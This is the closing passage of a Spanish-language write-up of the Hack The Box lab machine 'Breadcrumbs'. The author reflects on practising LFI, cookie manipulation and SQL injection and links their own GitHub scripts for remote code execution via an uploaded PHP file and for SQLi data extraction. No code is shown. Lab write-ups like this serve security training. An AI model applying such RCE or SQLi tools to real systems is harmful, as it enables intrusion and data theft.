Linda máquina, mucho jugueteo con inyecciones, lo cual me encantó. El `LFI` fue loco de encontrar, pero prestando atención lo logramos. El tema de las `cookies` no sé que tan real puede ser (me suena que si), pero me gusto bastante también. Y la inyección `SQL` la disfruté un montón. En definitiva, excelente máquina para practicar este tipo de ataques.

Además me sirvió para practicar mi scripting y crear lindos recursos para futuros usos:

* [**RCE** mediante el archivo **.php** (me gusto resto el script)](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/breadcrumbs/RCE_uploadPHPfile.py).
* [**SQLi**, fases para obtener la info de la base de datos](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/breadcrumbs/process_SQLi).

Por fin hemos llegado al final (**e.e 🏃‍♀️ la disfruté mucho**) nos leeremos en otra ocasión y como siempre, muchas gracias y a seguir rompiendo todo (: